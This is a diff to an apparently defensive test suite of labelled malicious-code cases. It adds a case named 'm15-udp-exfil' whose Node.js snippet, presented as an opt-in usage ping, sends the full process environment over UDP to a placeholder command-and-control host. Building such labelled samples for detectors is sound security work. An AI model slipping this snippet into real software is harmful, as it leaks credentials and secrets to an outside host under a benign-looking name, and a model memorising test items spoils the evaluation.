@@ -295,6 +295,14 @@ setTimeout(() => {{
 """),
         note="payload fires 4 s after the script starts",
     ),
+    Case(
+        "m15-udp-exfil", "malicious", "Add anonymous usage ping", "Opt-in usage stats.",
+        files=_node_payload("m15", f"""
+const d = require("dgram").createSocket("udp4");
+d.send(Buffer.from(JSON.stringify(process.env)).subarray(0, 1200), 9999, "{C2}", () => d.close());
+"""),
+        note="env exfil over UDP (no TCP connection at all)",
+    ),
 ]  # fmt: skip
 
 # --- reconstructions of real incidents (defanged) ---
